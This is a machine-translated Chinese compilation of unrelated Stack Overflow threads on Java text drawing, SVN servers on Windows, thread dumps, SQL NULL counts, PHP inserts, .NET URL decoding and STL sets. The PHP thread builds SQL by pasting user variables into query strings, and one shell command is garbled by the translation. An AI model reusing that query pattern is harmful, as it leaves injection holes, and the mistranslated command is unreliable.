> 时间：2012-05-31T00:16:49.673

我自己遇到了一些麻烦，这是我的解决方案：

```
Graphics2D g=....
FontRenderContext frc = g.getFontRenderContext();
TextLayout layout = new TextLayout(text, font, frc);
String[] outputs = text.split("\n");
for(int i=0; i<outputs.length; i++){
    g.drawString(outputs[i], 15,(int) (15+i*layout.getBounds().getHeight()+0.5)); 
```

希望有帮助....简单但有效。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T12:53:18.750

您可以使用 JLabel 并使用 html 嵌入文本。

```
JLabel.setText("<html>"+line1+"<br>"+line2); 
```

# svn - 64 位 Windows 上的 Subversion 服务器？

> ID：239543
> 
> 赞同：7
> 
> 时间：2008-10-27T10:48:03.200
> 
> 标签：svn, visualsvn-server

我想在 Windows Server 2003 64 位上安装 Subversion 服务器，我正在考虑使用[VisualSVN Server](http://www.visualsvn.com/server/)。这在 64 位环境中可以正常工作吗？在安装软件之前我应该​​注意什么问题或陷阱？

非常感谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-27T12:34:03.640

一个多月以来，我一直在我们的一个 MS SQL 2005 机器上使用 W2K3 x64 上的 VisualSVN 服务器，没有任何问题。我按照[安装指南](http://www.visualsvn.com/server/doc/server-config/)进行操作，无论是服务器代码还是集成的 Apache 服务器都没有任何问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T11:43:33.197

VisualSVN 1.5.1 适用于 Vista 64 位。[如果您尝试一些问题，您可以在此处](http://www.codeproject.com/KB/applications/CustomVisualSVNServerXSLT.aspx)获取 Vista 的一些更新，但您应该没问题。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-01-20T16:14:21.060

好的，伙计们，我得到了一切工作。所以，安装 VisualSVN。信不信由你，我安装了 2.0.8，几个小时后收到来自 RSS 的消息，有新版本 - 2.1，所以我进行了更新（至少能够检查更新过程，一切都很好）。然后安装 Ruby（我得到 1.8.6），然后是 Gems（1.3.1 是 req，但我得到 1.3.5）当你得到 Ruby 和 gems，输入 cmd 并输入： gem install rails -v=2.3.5 然后：宝石安装机架-v=1.0.1

然后我得到了最新的 Redmine 后备箱。安装 MySQL 5.0（不支持 5.1），创建新数据库（通过 shell 或 gui 工具），redmine 用户及其权限。

然后： gem install mysql + 复制[http://instantrails.rubyforge.org/svn/trunk/InstantRails-win/InstantRails/mysql/bin/libmySQL.dll](http://instantrails.rubyforge.org/svn/trunk/InstantRails-win/InstantRails/mysql/bin/libmySQL.dll)到 ruby​​/bin

编辑 redmine 的配置文件并运行 rack webserver ... al 应该可以工作。我有一个问题，我无法在新创建的 redmine 项目中看到存储库。

解决方案 - redmine.org/boards/2/topics/show/723

我的配置看起来像：SVN_BIN = "svn --trust-server-cert --non-interactive --config-dir c:/Repositories"

所以现在一切正常。我的下一步，将 svn repo 从 ald pc 移动到新的。完毕 ：）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-11-01T22:50:37.540

我对 Windows 上的 SVN 服务器有很多经验。

VisualSVN 工作正常。

但是它是x86。如果您希望您的服务器作为 64 位进程运行，您可以执行以下操作（也许您可以创建一个 hack 以使用 VisualSVN - 尚未尝试）：

> **Update1：​​这是一个过时的方法。没有必要再下载这个了。**
> 从这里下载 x64 服务器进程： http: [//nightlybuilds.tortoisesvn.net/latest/x64/full/svnserve.exe](http://nightlybuilds.tortoisesvn.net/latest/x64/full/svnserve.exe)

现在让我们将服务器安装为服务（这也是 VisualSVN 所做的）。

安装服务.bat

```
sc create svnserver binpath= "C:\Program Files\TortoiseSVN\bin\svnserve.exe --service -r D:\SvnRepositories" displayname= "Subversion" depend= Tcpip start= auto
pause 
```

如图所示保留空格。

如果您想删除它，请确保通过 services.msc 停止它，然后运行：

卸载服务.bat

```
sc delete svnserver
pause 
```

如果您在 Vista/7/2008 下运行，则需要以管理员身份运行。

希望这可以帮助

# java - 以编程方式转储线程 /JDI（Java 调试器接口）

> ID：239544
> 
> 赞同：7
> 
> 时间：2008-10-27T10:48:35.007
> 
> 标签：java, debugging, thread-dump

我喜欢以编程方式生成线程转储。我了解到基本上有两种方法可以做到这一点：

1.  使用“Java 虚拟机工具接口”JVM-TI
2.  使用更高抽象的“Java 调试器接口”JDI

对于 JVM-TI，我能够找到一些有用的信息，但我必须编写一个 JNI-DLL，至少目前我想避免这种情况。通过 JDI，我可以使用 Java，而且似乎可以在应用程序中使用它。但我无法找到某种教程或 HOWTO。我能找到的唯一文档是 Java-Docs [http://java.sun.com/j2se/1.5.0/docs/guide/jpda/jdi/](http://java.sun.com/j2se/1.5.0/docs/guide/jpda/jdi/)这不是很有帮助，因为它没有向我展示如何使用这些类。

那么，有人知道我可以阅读的好教程/书吗？

感谢您的帮助！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-10-27T15:07:25.627

还有第三种方式：Thread.getAllStackTraces()

[http://java.sun.com/javase/6/docs/api/java/lang/Thread.html#getAllStackTraces()](http://java.sun.com/javase/6/docs/api/java/lang/Thread.html#getAllStackTraces())

这比调试器界面容易得多......

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-03-27T18:53:16.750

[您可以从http://java.sun.com/javase/6/docs/api/java/lang/management/ThreadMXBean.html](http://java.sun.com/javase/6/docs/api/java/lang/management/ThreadMXBean.html)获得几乎所有需要的线程信息，包括死锁

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-31T09:55:12.103

Thread.getAllStackTraces() 仅转储所有线程的执行跟踪，但不提供特定线程已获得的对象锁或特定线程一直在等待的锁的信息。基本上，我们将无法解决这个问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T11:54:31.240

您是否考虑过远程替代方案？即[VisualVM](http://java.sun.com/javase/6/docs/technotes/guides/visualvm/applications_local.html)

![使用 visualVM 转储](https://i.stack.imgur.com/U0ckF.png)

[jps 和 jstack](http://wiki.caucho.com/Thread_dump)也是 JDK 5 中包含的有用工具，它们提供了一种快速命令行方法来获取所有当前线程的堆栈跟踪。

本文建议将 JDI 也用作[远程工具](http://xudegui.blogspot.com/2008/03/jdb-example-generating-thread-dump.html)。

因此，我不确定您是否可以在自己的程序中触发线程转储，而是找到一种在 Unix 平台上向自己发送 SIGQUIT 信号（kill -3）的方法，或者在 Unix 上按 Ctrl-\ 键或 Ctrl-Break在 Windows 平台上。

另外，[JDI 并不是用来调试运行 JDI 客户端的同一进程](http://x86.sun.com/thread.jspa?threadID=5284700&tstart=0)。我刚刚链接到的这个线程仍然是我发现在同一程序中实际使用 JDI 的最接近的线程。

# sql - 如何返回按 NULL 和 NOT NULL 分组的记录？

> ID：239545
> 
> 赞同：68
> 
> 时间：2008-10-27T10:48:48.737
> 
> 标签：sql, null, group-by

我有一个包含一`processed_timestamp`列的表——如果一条记录已被处理，那么该字段包含它被处理的日期时间，否则它为空。

我想编写一个返回两行的查询：

```
NULL        xx -- count of records with null timestamps
NOT NULL    yy -- count of records with non-null timestamps 
```

那可能吗？

**更新：**表很大，所以效率很重要。我可以只运行两个查询来分别计算每个总数，但如果可以避免的话，我想避免两次击中表格。

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2008-10-27T10:53:03.143

在 MySQL 中，您可以执行类似的操作

```
SELECT 
    IF(ISNULL(processed_timestamp), 'NULL', 'NOT NULL') as myfield, 
    COUNT(*) 
FROM mytable 
GROUP BY myfield 
```

* * *

## 回答 #2

> 赞同：45
> 
> 时间：2008-10-27T10:57:11.123

在 T-SQL (MS SQL Server) 中，这有效：

```
SELECT
  CASE WHEN Field IS NULL THEN 'NULL' ELSE 'NOT NULL' END FieldContent,
  COUNT(*) FieldCount
FROM
  TheTable
GROUP BY
  CASE WHEN Field IS NULL THEN 'NULL' ELSE 'NOT NULL' END 
```

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2008-10-27T10:56:10.313

甲骨文：

按 nvl2 分组（字段，'NOT NULL'，'NULL'）

* * *

## 回答 #4

> 赞同：25
> 
> 时间：2008-10-27T10:54:19.910

尝试以下操作，它与供应商无关：

```
select
    'null    ' as type,
    count(*)   as quant
    from       tbl
    where      tmstmp is null
union all
select
    'not null' as type,
    count(*)   as quant
    from       tbl
    where      tmstmp is not null 
```

在让我们当地的 DB2 大师看到这一点后，他同意：迄今为止提出的解决方案（包括这个）都不能避免全表扫描（如果时间戳没有索引，则对表进行全表扫描，否则对索引进行全表扫描）。他们都只扫描表中的每条记录一次。

所有 CASE/IF/NVL2() 解决方案都对每一行进行空字符串转换，从而在 DBMS 上引入了不必要的负载。这个解决方案没有这个问题。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-10-27T13:20:12.423

斯图尔特，

也许考虑这个解决方案。它（也是！）供应商非特定的。

```
SELECT count([processed_timestamp]) AS notnullrows, 
       count(*) - count([processed_timestamp]) AS nullrows 
FROM table 
```

至于效率，这通过将结果包含在一行上来避免 2x 索引查找/表扫描/其他任何事情。如果您在结果中绝对需要 2 行，则由于联合聚合，两次通过集合可能是不可避免的。

希望这可以帮助

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-10-27T10:53:51.067

如果是甲骨文，那么你可以这样做：

```
select decode(field,NULL,'NULL','NOT NULL'), count(*)
from table
group by decode(field,NULL,'NULL','NOT NULL'); 
```

我确信其他数据库允许类似的技巧。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-10-27T11:03:07.180

另一种 MySQL 方法是使用[`CASE`operator](http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#operator_case)，它可以推广到更多的替代方案`IF()`：

```
SELECT CASE WHEN processed_timestamp IS NULL THEN 'NULL' 
            ELSE 'NOT NULL' END AS a,
       COUNT(*) AS n 
       FROM logs 
       GROUP BY a 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2016-02-23T12:14:38.697

SQL Server（从 2012 年开始）：

```
SELECT IIF(ISDATE(processed_timestamp) = 0, 'NULL', 'NON NULL'), COUNT(*)
FROM MyTable
GROUP BY ISDATE(processed_timestamp); 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2016-03-03T05:46:35.773

T-sql（sql-server）中的另一种方式

```
select  count(case when t.timestamps is null 
                    then 1 
                    else null end) NULLROWS,
        count(case when t.timestamps is not null 
                    then 1 
                    else null end) NOTNULLROWS
from myTable t 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-28T02:49:34.880

如果您的数据库对表具有有效的 COUNT(*) 函数，则可以 COUNT 中较小的数字，然后减去。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-27T11:05:48.873

我个人喜欢 Pax 的解决方案，但如果您绝对只需要返回一行（就像我最近所做的那样），在 MS SQL Server 2005/2008 中，您可以使用 CTE “堆叠”这两个查询

```
with NullRows (countOf)
AS
(
    SELECT count(*) 
    FORM table 
    WHERE [processed_timestamp] IS NOT NULL
)
SELECT count(*) AS nulls, countOf
FROM table, NullRows
WHERE [processed_timestamp] IS NULL
GROUP BY countOf 
```

希望这可以帮助

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-27T12:36:27.473

[T-SQL]：

```
select [case], count(*) tally
from (
  select 
  case when [processed_timestamp] is null then 'null'
  else 'not null'
  end [case]
  from myTable
) a 
```

并且您可以在case 语句中添加您想要形成分区的任何其他值，例如今天、昨天、中午和下午2 点之间、星期四下午6 点之后。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-27T13:56:27.827

```
Select Sum(Case When processed_timestamp IS NULL
                         Then 1
                         Else 0
                 End)                                                               not_processed_count,
          Sum(Case When processed_timestamp Is Not NULL
                         Then 1
                         Else 0
                 End)                                                               processed_count,
          Count(1)                                                                total
From table 
```

编辑：没有仔细阅读，这个返回单行。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-10-28T02:48:30.077

在甲骨文中

```
SELECT COUNT(*), COUNT(TIME_STAMP_COLUMN)
FROM TABLE; 
```

count(*) 返回所有行的计数

count(column_name) 返回不为 NULL 的行数，所以

```
SELECT COUNT(*) - COUNT(TIME_STAMP_COLUMN) NUL_COUNT,
                  COUNT(TIME_STAMP_COLUMN) NON_NUL_COUNT
FROM TABLE 
```

应该做的工作。

如果该列被索引，您可能最终会进行某种范围扫描并避免实际读取该表。

# php - 在 PHP 中写入多个表

> ID：239546
> 
> 赞同：2
> 
> 时间：2008-10-27T10:50:13.663
> 
> 标签：php, windows, com, adodb

```
$sql = "INSERT INTO images (path, useremail, approved, flagged,caption,date) VALUES ('$target','$email',0,0, '$caption','$b')";
$sql1 = "INSERT INTO users (name, email, phone) VALUES ('$peoplename','$email','$phone')"
$conn->execute($sql, $sql1); 
```

以上是我用来尝试写入 2 个表的代码。在我通过 COM 对象引入连接之前，我可以做到这一点不是问题，但现在我由于某种原因不能做到这一点。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-27T11:03:07.180

我认为第二个参数是用于传递要绑定到查询的参数。

如果服务器允许您一次执行两个 sql 语句，那么这可能会起作用。（在每个查询的末尾添加一个终止分号，并将两个查询连接在一起作为一个字符串。）

```
$sql = "INSERT INTO images (path, useremail, approved, flagged,caption,date) VALUES ('$target','$email',0,0, '$caption','$b');";
$sql1 = "INSERT INTO users (name, email, phone) VALUES ('$peoplename','$email','$phone');";
$conn->execute($sql . $sql1); 
```

否则很明显

```
 $conn->execute($sql); 
   $conn->execute($sql1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T10:54:49.393

第二行缺少分号。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T11:03:36.570

为什么不把它作为一个 SQL 语句呢？

```
$sql = "INSERT INTO images (path, useremail, approved, flagged,caption,date) VALUES ('$target','$email',0,0, '$caption','$b'); INSERT INTO users (name, email, phone) VALUES ('$peoplename','$email','$phone')";
$conn->execute($sql); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T11:21:03.350

德鲁，我不是 PHP 专家，但我在其他答案中看到的一件事是事务完整性。即使将两个 INSERT 堆叠在用分号分隔的同一字符串中，也可以确保操作的原子性（如果这对您很重要 :-)

希望这可以帮助

# templates - 面向 Web 开发人员的 Web 设计工具

> ID：239552
> 
> 赞同：3
> 
> 时间：2008-10-27T10:54:06.853
> 
> 标签：templates, user-interface, code-generation

我想看看是否有这样的工具，它允许可重用​​的 Web 模板，其中包含易于应用的菜单和表单等组件。基本上我想使用 html 模拟一个非常简单的界面，看看导航是否正常工作，然后生成一个纯 XHTML/CSS 供我在我的 Web 项目中使用。

供您参考，我使用 Ruby on Rails。但是，我希望这样的网页设计工具尽可能语言中立。

更新：我正在寻找 mac 上的 RapidWeaver 之类的东西，但更灵活且语言中立（似乎 RapidWeaver 对 php 有偏见）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T11:10:19.863

Aptana 和脚本/示例？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T13:28:24.780

试试这个[http://www.blumentals.net/webuilder/](http://www.blumentals.net/webuilder/)这是最好的编辑器（对我来说）支持 javascript、css、php 等。

# exception-handling - 强制应用程序抛出特定异常

> ID：239556
> 
> 赞同：1
> 
> 时间：2008-10-27T10:56:57.440
> 
> 标签：exception-handling, mocking

我们正在替换我们应用程序中的异常处理系统以符合 Vista 认证，但问题是如何强制抛出某些异常，以便我们可以检查响应。

不幸的是，整个应用程序的编写没有考虑适当的分层、抽象或隔离原则，并且在时间范围内引入模拟和单元测试是不可能的:(

我的想法是通过编译器指令或通过尊重配置文件中的值来引入将引发特定异常的代码。然后我们可以正常运行应用程序并手动检查异常是如何处理的。

只是想我会把它放在那里，看看 SO 社区是否能想到更好的东西！

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T10:59:48.263

引入这段代码：

```
throw new Exception("test"); 
```

如果您需要异常始终存在（即，不仅仅是测试代码），则将其隐藏在命令行参数后面。

```
C:\Users\Dude> myapp.exe /x 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T11:28:46.223

我可能对此一无所知，但我的第一个想法是在运行某些代码时使用面向方面的编程来引发异常。spring.net 对此提供了[支持](http://www.springframework.net/docs/1.2.0-RC1/reference/html/aop.html)，尽管我不知道它对您的目的有多好。我不会相信我的话，但这是需要调查的。

# java - 什么时候应该使用原语而不是包装对象？

> ID：239560
> 
> 赞同：15
> 
> 时间：2008-10-27T11:00:50.473
> 
> 标签：java, performance, object, primitive

其实[这里](https://stackoverflow.com/questions/564/what-is-the-difference-between-an-int-and-an-integer-in-javac)有一个类似的题目，实用价值不大。据我了解，原语性能更好，应该在任何地方使用，除了需要与对象相关的功能（例如`null`检查）的情况。对？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-27T11:23:31.130

不要忘记，由于为每个装箱事件创建一个新包装器非常昂贵，特别是考虑到它通常在方法的单个范围内使用，因此[自动装箱](http://chaoticjava.com/posts/autoboxing-tips/)使用一个通用包装器池。

这实际上是[享元设计模式](https://web.archive.org/web/20130517072258/http://www.exciton.cs.rice.edu/JavaResources/DesignPatterns/FlyweightPattern.htm)的一种实现。当一个众所周知的值发生装箱时，不是创建一个新的包装器实例，而是从池中获取一个预先创建的实例并返回。

一个后果是：**仍然不建议使用自动装箱进行科学计算**。例如，代码 d = a * b + c 对 a、b、c 和 d 使用 Integer 类，生成的代码为 d.valueOf(a.intValue() * b.intValue() + c.intValue( ））。所有这些方法调用都有自己的开销，因此**通常建议在需要将原语存储在集合中时使用自动装箱**。

即使这样，如果您有**大量**的 Integer 包装 int 集合，开销可能意味着更长的执行时间，最多**20 倍**，如[本文所述](http://www.javaspecialists.co.za/archive/Issue090.html)。

* * *

Jb 添加了这个重要的评论：

> Wrapper.valueOf(primitive) 也使用包装池。所以更喜欢 Integer.valueOf(5) 到 new Integer(5)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-27T11:12:13.290

图元在使用时速度更快*，*因为对象在使用前需要拆箱；因此，VM 需要执行一个额外的步骤。例如，为了对 Integer 执行算术运算，必须首先将其转换为 int 才能执行算术运算。

在许多业务应用程序中，这可能并不重要。但是，如果您正在编写一些非常繁重的东西，例如图形转换处理器，那么您更有可能关心。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T11:04:21.980

是的，原语比对象快。从 java 5 开始，您甚至可以混合原语和对象，而无需手动将其转换为另一种。自动装箱机制就可以解决这个问题。

这意味着如果您将原语放入集合中，编译器不会抱怨，而是将原语隐式转换为对象。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T11:12:20.420

我想说，只有当您分析应用程序并看到自动装箱是性能或内存问题时，您才应该担心使用原语而不是包装器。根据我的经验，在谈论原语与包装对象时，内存在 CPU 周期之前就成为一个问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-27T12:25:09.697

如果您需要在集合中存储原语，您可以使用[commons-primitives](http://commons.apache.org/primitives/)。

我更喜欢使用原语来包装，只有绝对需要包装的地方是实体类。数据库支持空值，所以实体也应该支持。

我曾经参与过在数据库访问中使用原语（和自制 ORM）的项目：

```
 class Foo{
    int xxx = -1;
 ...
 } 
```

然后你有：

```
 void persist(Foo foo){
     ...
     statement.setInt(15,foo.getXXX()==-1?null:foo.getXXX());
     ...
} 
```

上帝是邪恶的。

# .net - 在不使用 HttpUtility.UrlDecode 的情况下解码转义的 Url

> ID：239567
> 
> 赞同：39
> 
> 时间：2008-10-27T11:05:45.737
> 
> 标签：.net, url

是否有任何函数可以将转义的 Url 字符串转换为其非转义形式？`System.Web.HttpUtility.UrlDecode()`可以完成这项工作，但我不想添加对`System.Web.dll`. 由于我的应用程序不是 Web 应用程序，因此我不想添加仅在程序集中使用函数的依赖项。

**更新：**查看Rick Strahl关于同一问题[的博客文章。](http://www.west-wind.com/weblog/posts/617930.aspx)

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2008-10-27T12:20:19.817

**编辑：**使用静态方法**`Uri.UnescapeDataString()`**解码您的 URL：

*编码：* `http%3a%2f%2fwww.google.com%2fsearch%3fhl%3den%26q%3dsomething%20%2323%26btnG%3dGoogle%2bSearch%26aq%3df%26oq%3d`

*解码：* `http://www.google.com/search?hl=en&q=something #23&btnG=Google+Search&aq=f&oq=`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-11-26T00:14:46.350

如果您使用的是 .NET 4.0 或更高版本，则可以使用[WebUtility.UrlDecode](https://msdn.microsoft.com/en-us/library/system.net.webutility.urldecode(v=vs.110).aspx)，它与客户端配置文件一起使用，并且还可以正确处理加号（请参阅[此](http://blogs.msdn.com/b/yangxind/archive/2006/11/09/don-t-use-net-system-uri-unescapedatastring-in-url-decoding.aspx)讨论）。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-27T12:02:12.443

重新不​​加载 System.Web.dll - 正如其他人所指出的，除非您知道您需要处理可能没有它的客户端（“客户端配置文件”、“紧凑框架”、“微框架”，否则不值得兴奋”、“银光”）。

重新空间；真的不会很多；请注意，.NET 程序集是在逐个方法的基础上进行 JIT 处理的，因此仅使用几种方法不会产生任何重大开销。

真正的问题 (IMO) 是您对客户端拥有 System.Web.dll 的信心程度；如果您对他们使用完整的框架感到高兴，那么就去做吧。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2011-11-23T21:11:22.077

@Smith
我遇到了保存问题。没有变化或只是进一步混乱。

在测试了很多东西之后，我注意到一个测试字符串确实解码了。最终，我不得不创建一个新的空字符串，将其值设置为编码字符串，然后`WebUtility.HtmlDecode`在`Uri.UnescapeDataString`新字符串上运行。出于某种原因，我不得不按照我提到的顺序运行解码和取消转义。奇怪。

我用这样的东西解决了它。

```
Dim strEncoded as string="http%3a%2f%2fwww.google.com%2fsearch%3fhl%3den%26q%3dsomething%20%2323%26btnG%3dGoogle%2bSearch%26aq%3df%26oq%3d"

Dim strDecoded as string = ""
strDecoded = strEncoded
strDecoded = WebUtility.HtmlDecode(strDecoded)
strDecoded = Uri.UnescapeDataString(strDecoded) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T11:08:50.507

Microsoft ACE 团队在[Anti-XSS 库](http://blogs.msdn.com/ace_team/archive/2006/11/20/microsoft-anti-cross-site-scripting-library-v1-5-is-done.aspx)中提供了扩展（和更好）的解码版本。但是我不确定它是否只是通过。

（老实说，我不明白你为什么那么担心对 System.web.dll 的依赖）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-27T11:46:35.360

您已经对 .NET 框架、CLR etal 产生了巨大的依赖。所以，事实上，您已经间接依赖 System.Web.DLL；如果没有本地计算机上的存在，您的应用程序将无法运行。

你担心记忆？你有记忆问题吗？如果您的内存问题非常严重，以至于无法将几 KB 的 DLL 加载到应用程序的内存中，那么您为什么要编写 .NET 代码？或者你只是过早地优化？

所以不用担心。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-04-06T00:29:43.780

只是稍微了解它为什么不同。一个转换为大写，一个转换为小写。所以解码是特定于编码类型的。

**System.Net.WebUtility**（内部）**+ 65**：

```
private static char IntToHex(int n)
{
    if (n <= 9)
        return (char) (n + 48);
    else
        return (char) (n - 10 + 65);
} 
```

**System.Web.Util.HttpEncoderUtility**（内部）- **+ 97**

```
public static char IntToHex(int n)
{
    if (n <= 9)
        return (char) (n + 48);
    else
        return (char) (n - 10 + 97);
} 
```

**示例**：

```
var test1 = WebUtility.UrlEncode("http://www.test.com/?param1=22&param2=there@is<a space");
var test2 = HttpUtility.UrlEncode("http://www.test.com/?param1=22&param2=there@is<a space"); 
```

**回应**：

```
test1 -> http%3A%2F%2Fwww.test.com%2F%3Fparam1%3D22%26param2%3Dthere%40is%3Ca+space
test2 -> http%3a%2f%2fwww.test.com%2f%3fparam1%3d22%26param2%3dthere%40is%3ca+space 
```

[更多信息....](https://www.samnoble.co.uk/2014/05/21/beware-webutility-urlencode-vs-httputility-urlencode/)

* * *

## 回答 #8

> 赞同：-3
> 
> 时间：2012-05-09T14:59:57.180

`System.Net.WebUtility.HtmlDecode`还在研究 .NET 4.0 客户端配置文件。

# virtual-machine - 网络应用基础设施

> ID：239575
> 
> 赞同：4
> 
> 时间：2008-10-27T11:09:25.620
> 
> 标签：virtual-machine

我已经为大中型组织定制了几个企业应用程序以供内部使用（一些具有最小的外部足迹）。我现在有一个 Web 项目的计划，它可能（希望）看到一个庞大的用户群，其每日流量比我以前的项目所达到的还要多。显然，我希望我的设计具有可扩展性和可维护性。问题是从物理布局的角度（服务器/虚拟机）我不知道会发生什么。

问题：对此有什么好的资源？图书？网站？我在可扩展的应用程序设计方面发现了很多，但在可扩展的物理设计方面却一无所获。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T11:22:54.953

如果不知道您打算使用什么技术，就很难给出准确的答案。如果扩展是主要驱动因素，那么应用程序的方法不能完全不知道计划的物理基础设施。

缓存必须是一个大问题。还可以扩展数据所在的硬件。

一个非常有趣和有启发性的读物是实时日志的真实世界生物，[缩放历史](http://www.danga.com/words/2005_oscon/oscon-2005.pdf)，以及他们如何通过网站的大规模增长来增加他们的实体存在。他们工作的一个主要分支是一种新的缓存技术 memcached，它现在被 FaceBook 等使用。这是令人惊讶的诚实。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T11:26:18.537

高[可扩展性](http://highscalability.com/)博客很好。您可以查看他们的一些示例，这些示例涵盖了大型站点的物理部分。我想说常见的第一级物理扩展技术是负载均衡器。这很容易，但最简单的是，您仍然有一个潜在瓶颈的数据库。扩展的大多数物理部分都需要您添加更多内容，而真正的问题出现在您被迫仅使用其中一种的地方。

# c# - 如何阻止 DataGridView 自动选择一行？

> ID：239576
> 
> 赞同：2
> 
> 时间：2008-10-27T11:09:54.810
> 
> 标签：c#, .net, datagridview

我在 TabPage 中有一个 DataGridView 控件，我监听 SelectionChanged 事件。当 TabPage 被选中时，DataGridView 选择第一行并触发 SelectionChanged 事件。如何阻止它自动选择一行？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T11:48:36.463

我可以想到两种解决方法，如果你知道事件总是触发，在第一个选择上设置一个 bool 标志，然后只执行其余的 SelectionChanged 代码。

另一种方法是有一个隐藏控件，它是 TabPage 的第一个 TabStop，因此是第一个获得焦点的控件（我说这个当然没有测试任何这个，只是我的两分钱）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-11-17T10:05:38.117

覆盖 TabPage 的函数“OnEnter”。

在该函数中调用DataGridView 的函数“ClearSelecton”。

# api - 如何访问 CruiseContol.NET Web 仪表板报告的 XML 版本（通过 HTTP）？

> ID：239587
> 
> 赞同：1
> 
> 时间：2008-10-27T11:14:48.230
> 
> 标签：api, build-automation, cruisecontrol.net, report

我需要确定上次构建的状态（成功/失败），我这样做：

```
report_url = 'http://.../ViewLatestBuildReport.aspx'
success_marker = '<td class="header-title" colspan="2">BUILD SUCCESSFUL</td>'
page = urllib.urlopen(report_url)
if all(success_marker not in line for line in page):
  # build is not good, do something
  ... 
```

但这很浪费（加载整个 HTML 页面）、容易出错（我已经遇到了字节/unicode 错误）并且很脆弱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-30T17:30:36.583

好吧，我有点想通了。CCTray 通过轮询来跟踪构建状态`XmlServerReport.aspx`，这是（惊喜！）XML。

所以我目前的解决方案是这样的：

```
import sys, urllib, xml.sax, xml.sax.handler

report_url = 'http://.../CCNET/XmlServerReport.aspx'

class FoundBuildStatus(Exception):
  def __init__(self, status):
    self.build_status = status

class Handler(xml.sax.handler.ContentHandler):
  def startElement(self, name, attrs):
    if name == 'Project' and attrs.get('name') == '...':
      status = attrs.get('lastBuildStatus')
      if status:
        raise FoundBuildStatus(status)

page = urllib.urlopen(report_url)
try:
  xml.sax.parse(page, Handler())
except FoundBuildStatus, ex:
  if ex.build_status == 'Failure':
    # build is not good, do something
    ... 
```

在我的环境中，它比最初的基于 HTML 的解决方案快大约 8 倍。

# c++ - STL 排序条件可能改变的集合

> ID：239588
> 
> 赞同：9
> 
> 时间：2008-10-27T11:15:02.850
> 
> 标签：c++, stl, set

我有一个定义了自定义排序的 C++ STL 集。

这个想法是，当项目被添加到集合中时，它们自然会按照我想要的顺序排列。

但是，我刚刚意识到，排序谓词会随着时间的推移而改变。

据推测，集合中的项目将不再按顺序排列。

所以真的有两个问题：

1.  物品出现故障是否有害？我是否正确地说，可能发生的最坏情况是新条目可能会被放入错误的位置（实际上我可以忍受）。或者，这会导致崩溃、丢失条目等吗？

2.  有没有办法“刷新”集合的顺序？您似乎无法在集合上使用 std::sort() 。我能想到的最好的办法是将内容转储到临时容器中并重新添加它们。

有任何想法吗？

谢谢，

约翰

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T11:38:55.203

`set`使用排序来查找项目。如果根据 ordering1 插入 N 个项目，并根据 ordering2 插入一个项目，则集合无法确定该项目是否已在。

它将违反类不变量，即每个项目仅存在一次。

所以它*是*有害的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T16:10:02.690

使用 STL 执行此操作的唯一安全方法是使用更改的谓词创建一个新集合。例如，当您需要使用新谓词对集合进行排序时，您可以执行以下操作：

```
std::set<int> newset( oldset.begin(), oldset.end(), NewPred() ); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T11:41:18.257

这实际上取决于实现。
STL 实现可以并且通常会假设用于排序的谓词是稳定的（否则，不会定义“排序的”）。当您更改谓词实例的行为时，至少可以构造一个有效的 STL 实现来格式化您的硬盘驱动器。

所以，是的，您需要将这些项目重新插入一个新集合中。

或者，您可以构建自己的容器，例如用于二进制搜索的向量 + 排序 + 下界。然后，当谓词行为发生变化时，您可以重新排序。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T12:25:27.060

